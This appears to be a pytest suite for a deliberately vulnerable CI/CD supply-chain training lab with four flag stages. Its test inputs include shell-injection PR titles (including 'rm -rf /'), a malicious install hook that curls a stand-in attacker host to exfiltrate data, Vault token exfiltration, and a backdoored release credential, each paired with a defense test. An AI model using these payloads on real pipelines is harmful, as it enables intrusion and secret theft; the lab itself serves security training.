#!/usr/bin/env python3
"""Comprehensive Unit and Integration Tests for Lab 12 (PipePoison CI/CD & Supply Chain Lab)."""

import os
import sys
import pytest
from fastapi.testclient import TestClient

# Add app dir to sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "app")))

from main import app, FLAGS, STATE, VAULT_SECRETS

client = TestClient(app)


@pytest.fixture(autouse=True)
def reset_lab_state():
    """Reset the in-memory state before each test."""
    STATE["stages_solved"] = {
        "stage1": False,
        "stage2": False,
        "stage3": False,
        "stage4": False,
    }
    STATE["policies"] = {
        "sanitize_pr_inputs": False,
        "scoped_registries_only": False,
        "oidc_short_lived_tokens": False,
        "enforce_slsa_signatures": False,
    }


def test_status_endpoint():
    """Verify overall lab status and port configuration."""
    response = client.get("/api/status")
    assert response.status_code == 200
    data = response.json()
    assert data["status"] == "running"
    assert data["port"] == 8012
    assert data["total_stages"] == 4
    assert data["solved_count"] == 0


def test_web_ui_served():
    """Verify the root endpoint serves the interactive HTML dashboard."""
    response = client.get("/")
    assert response.status_code == 200
    assert "PipePoison" in response.text
    assert "text/html" in response.headers.get("content-type", "")


def test_stage1_ppe_vulnerable():
    """Stage 1: Command injection via PR title executes on runner and awards Flag 1."""
    # 1. Create malicious PR
    pr_res = client.post("/api/vcs/pull-requests", json={
        "title": "feat: optimize ; whoami ; id ; #",
        "author": "attacker",
        "branch": "exploit-ppe",
        "script_injection": "echo 'Pwned' && env"
    })
    assert pr_res.status_code == 200
    pr_id = pr_res.json()["pull_request"]["id"]

    # 2. Trigger pipeline
    trig_res = client.post("/api/pipelines/trigger", json={"pr_id": pr_id})
    assert trig_res.status_code == 200
    data = trig_res.json()
    assert data["stage1_exploited"] is True
    assert data["flag"] == FLAGS["stage1"]
    assert "uid=1001(runner)" in data["logs"]


def test_stage1_defense_policy():
    """Stage 1 Defense: Enabling sanitize_pr_inputs blocks command injection."""
    # Enable policy
    client.post("/api/security/policies", json={"policy": "sanitize_pr_inputs", "enabled": True})

    pr_res = client.post("/api/vcs/pull-requests", json={
        "title": "feat: test ; rm -rf / ; #",
        "author": "attacker"
    })
    pr_id = pr_res.json()["pull_request"]["id"]

    trig_res = client.post("/api/pipelines/trigger", json={"pr_id": pr_id})
    assert trig_res.status_code == 200
    data = trig_res.json()
    assert data["stage1_exploited"] is False
    assert data["flag"] is None


def test_stage2_dependency_confusion_vulnerable():
    """Stage 2: Higher version malicious package on public mirror hijacks resolver and awards Flag 2."""
    # 1. Publish malicious high version to public mirror
    pub_res = client.post("/api/registry/publish-public", json={
        "package_name": "octocorp-crypto-vault",
        "version": "99.0.0",
        "install_hook_script": "import os; os.system('curl http://attacker.local/exfil?cmd=id')"
    })
    assert pub_res.status_code == 200

    # 2. Build dependencies
    build_res = client.post("/api/pipelines/build-deps", json={
        "package_name": "octocorp-crypto-vault"
    })
    assert build_res.status_code == 200
    data = build_res.json()
    assert data["source"] == "public"
    assert data["resolved_version"] == "99.0.0"
    assert data["stage2_exploited"] is True
    assert data["flag"] == FLAGS["stage2"]


def test_stage2_defense_policy():
    """Stage 2 Defense: Scoped registry enforcement locks octocorp-* to internal index."""
    client.post("/api/security/policies", json={"policy": "scoped_registries_only", "enabled": True})

    # Even with high version on public
    client.post("/api/registry/publish-public", json={
        "package_name": "octocorp-crypto-vault",
        "version": "99.0.0",
        "install_hook_script": "import os; os.system('curl http://attacker.local')"
    })

    build_res = client.post("/api/pipelines/build-deps", json={
        "package_name": "octocorp-crypto-vault"
    })
    assert build_res.status_code == 200
    data = build_res.json()
    assert data["source"] == "internal"
    assert data["resolved_version"] == "1.0.0"
    assert data["stage2_exploited"] is False


def test_stage3_secrets_exfiltration():
    """Stage 3: Exfiltrating the master Vault token unlocks production access and awards Flag 3."""
    # Exfiltrate to collector
    exfil_res = client.post("/api/exfil/collector", json={
        "source": "runner-01",
        "data": f"EXFIL: VAULT_TOKEN={VAULT_SECRETS['VAULT_TOKEN']}"
    })
    assert exfil_res.status_code == 200
    assert exfil_res.json()["secrets_harvested"] is True
    assert exfil_res.json()["flag"] == FLAGS["stage3"]

    # Verify Vault endpoint directly
    vault_res = client.post(
        "/api/vault/verify-token",
        headers={"X-Vault-Token": VAULT_SECRETS["VAULT_TOKEN"]}
    )
    assert vault_res.status_code == 200
    assert vault_res.json()["authenticated"] is True
    assert vault_res.json()["flag"] == FLAGS["stage3"]


def test_stage3_defense_policy():
    """Stage 3 Defense: OIDC short-lived federation rejects static Vault tokens."""
    client.post("/api/security/policies", json={"policy": "oidc_short_lived_tokens", "enabled": True})

    vault_res = client.post(
        "/api/vault/verify-token",
        headers={"X-Vault-Token": VAULT_SECRETS["VAULT_TOKEN"]}
    )
    assert vault_res.status_code == 403
    assert "Permission Denied" in vault_res.json()["error"]


def test_stage4_release_backdoor_tampering():
    """Stage 4: Backdooring release artifact and deploying bypasses unsigned check and awards Flag 4."""
    # 1. Build a new release
    build_res = client.post("/api/release/build")
    assert build_res.status_code == 200
    rel_id = build_res.json()["release"]["id"]

    # 2. Tamper artifact
    tamper_res = client.post("/api/release/tamper", json={
        "release_id": rel_id,
        "injected_payload": "backdoor_admin:OctoBackdoor!2026:ROLE_ROOT_ADMIN",
        "tamper_checksum": True
    })
    assert tamper_res.status_code == 200
    assert tamper_res.json()["release"]["backdoored"] is True

    # 3. Deploy to staging
    deploy_res = client.post(f"/api/release/deploy-test?release_id={rel_id}")
    assert deploy_res.status_code == 200
    data = deploy_res.json()
    assert data["stage4_exploited"] is True
    assert data["flag"] == FLAGS["stage4"]


def test_stage4_defense_policy():
    """Stage 4 Defense: Enforcing SLSA signatures blocks tampering and unsigned deployments."""
    client.post("/api/security/policies", json={"policy": "enforce_slsa_signatures", "enabled": True})

    build_res = client.post("/api/release/build")
    rel_id = build_res.json()["release"]["id"]

    # Tampering should now be rejected
    tamper_res = client.post("/api/release/tamper", json={
        "release_id": rel_id,
        "injected_payload": "evil"
    })
    assert tamper_res.status_code == 403


def test_flag_submission_lifecycle():
    """Verify central flag grading, submission validation, and progress tracking."""
    # Submit invalid flag
    bad_res = client.post("/api/submit-flag", json={"stage": "stage1", "flag": "FLAG{WRONG}"})
    assert bad_res.status_code == 200
    assert bad_res.json()["correct"] is False

    # Submit valid flags for all 4 stages
    for i in range(1, 5):
        st = f"stage{i}"
        res = client.post("/api/submit-flag", json={"stage": st, "flag": FLAGS[st]})
        assert res.status_code == 200
        assert res.json()["correct"] is True
        assert res.json()["solved_count"] == i

    final_status = client.get("/api/status").json()
    assert final_status["solved_count"] == 4
    assert all(final_status["stages"].values())
